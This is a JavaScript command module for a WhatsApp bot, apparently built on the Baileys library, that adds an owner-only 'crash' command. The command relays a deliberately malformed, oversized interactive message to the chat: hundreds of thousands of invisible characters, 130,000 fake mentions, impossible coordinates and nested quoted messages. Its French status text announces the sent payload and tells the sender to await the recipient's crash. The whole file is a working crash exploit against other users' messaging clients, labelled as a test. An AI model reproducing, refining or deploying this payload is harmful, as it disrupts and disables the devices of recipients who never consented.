const { isOwner } = require('../utils/isOwner');
const settingsStore = require('../utils/settingsStore');

module.exports = {
  name: 'crash',
  execute: async (sock, msg, args) => {
    const chatJid = msg.key.remoteJid;
    if (!isOwner(msg)) {
  await sock.sendMessage(chatJid, { text: ' Seul le owner peut lancer ce test.' }, { quoted: msg });
  return;
    }

    try {
  const ZWJ = '\u2063';
      const hugeZWJ = ZWJ.repeat(800000);
  const massiveMentions = Array(130000).fill('0@s.whatsapp.net');
  const crazyLat = 1_200_000_000;
  const crazyLng = -1_200_000_000;

  const innerInteractive = {
  viewOnceMessage: {
  message: {
  interactiveResponseMessage: {
  body: { text: 'CrashTest[ # ]', format: 'DEFAULT' },
  version: 999999
   }
  }
   }
  };

      const outerInteractive = {
  viewOnceMessage: {
  message: {
  interactiveMessage: {
  header: {
  title: hugeZWJ,
  hasMediaAttachment: false,
  locationMessage: {
  degreesLatitude: crazyLat,
  degreesLongitude: crazyLng,
   name: hugeZWJ,
   address: hugeZWJ
   }
  },
  body: { text: hugeZWJ },
   contextInfo: {
  participant: '0@s.whatsapp.net',
   remoteJid: 'status@broadcast',
   mentionedJid: massiveMentions,
  quotedMessage: innerInteractive
  },
  interactiveResponseMessage: {
  body: { text: 'CrashTest[ # ]', format: 'DEFAULT' },
  version: 999999
   }
  }
   }
  }
      };

  // Optional: uncomment to add a large media blob (increases size further)
  /*
  const dummyBlob = Buffer.from('A'.repeat(3_000_000)).toString('base64');
  outerInteractive.viewOnceMessage.message.interactiveMessage.header.locationMessage.thumbnail = {
   url: `data:image/png;base64,${dummyBlob}`
  };
      */

  await sock.relayMessage(chatJid, outerInteractive, {
  messageId: undefined,
  participant: { jid: chatJid }
      });

  await sock.sendMessage(chatJid, { text: 'Payload envoyé – attendez le crash du destinataire.' }, { quoted: msg });
    } catch (err) {
  console.error('Erreur lors de l’envoi du payload :', err);
  await sock.sendMessage(chatJid, { text: 'Échec de l’envoi du payload.' }, { quoted: msg });
    }
  }
};
